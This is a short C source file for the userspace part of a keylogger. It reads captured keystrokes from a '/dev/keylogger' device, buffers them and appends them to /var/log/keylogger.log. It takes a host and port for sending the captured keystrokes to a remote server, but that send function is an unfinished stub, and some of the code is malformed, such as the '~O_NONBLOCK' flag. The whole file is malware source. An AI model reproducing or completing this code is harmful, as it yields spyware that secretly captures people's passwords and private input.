#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define BUFFER_LEN 1024

char buffer[BUFFER_LEN];
int currentSize = 0;

int sendToServer(char *host, int port)
{
    // TODO try to send data to server
    return -1;
}

void logToFile()
{
    FILE *file  = fopen("/var/log/keylogger.log", "a+");
    fwrite(buffer, 1, currentSize, file);
    currentSize = 0;
    fclose(file);
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        fprintf(stderr, "Incorrect number of arguments\n");
        exit(1);
    }

    char *host = argv[1];
    int port = atoi(argv[2]);

    int dev;
    if ((dev = open("/dev/keylogger", O_RDONLY | ~O_NONBLOCK)) == -1)
    {
        fprintf(stderr, "Cannot open device\n");
        exit(2);
    }

    int readBytes;
    while (1)
    {
        if ((readBytes = read(dev, buffer + currentSize, BUFFER_LEN - currentSize)) == -1)
        {
            fprintf(stderr, "Error reading device\n");
            close(dev);
            exit(3);
        }

        currentSize += readBytes;
        if (currentSize == BUFFER_LEN && !sendToServer(host, port) || 1)
        {
            logToFile();
        }

        sleep(2);
    }
}
